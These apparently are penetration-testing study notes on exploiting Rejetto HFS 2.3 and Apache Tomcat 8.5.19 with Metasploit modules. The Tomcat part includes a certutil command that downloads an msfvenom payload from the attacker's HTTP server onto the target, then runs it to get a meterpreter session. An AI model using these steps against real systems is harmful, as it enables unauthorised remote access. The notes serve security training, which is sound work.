## Exploiting A Vulnerable HTTP File Server

An HTTP File Server (HFS) is a web server that is designed for file & document sharing.

HFS typically run on TCP port 80 and utilize the HTTP protocol for underlying communication.

Rejetto HFS is a popular free and open source HTTP file server that be setup on both Windows and Linux.

Rejetto HFS V2.3 is vulnerable to a remote command execution attack.

MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS which is:"windows/http/rejetto_hfs_exec"

## Exploiting A Vulnerable Apache Tomcat Web Server


Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server.

It is used to build and host dynamic websites and web applications based on the Java software platform.

Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients. 

Apache Tomcat runs on TCP port 8080 by default.

The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.

The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.

Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.

We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server which is: "multi/http/tomcat_jsp_upload_bypass".

This will give us a shell session and not a meterpreter.

We can also create our own meterpreter payload using msfvenom and upload it to the target system. After creating the payload, we will start a http server on our Kali machine using python:`python3 -m http.server` This will start a simple HTTP server on our local machine on port 8000.

To upload the payload on the target system:`certutil -urlcache -f http://(our ip address):(port number)/(path to payload) (name of payload on target system)`

Now, we can start another msfconsole instance and use multi/handler setting the same options we used in the msfvenom creating the payload. We run the multi/handler module. 

We go back to our shell session on the target system and run the payload:`.\(payload file name)`. Now, if we returned back to the multi/handler module, we will find a meterpreter session.
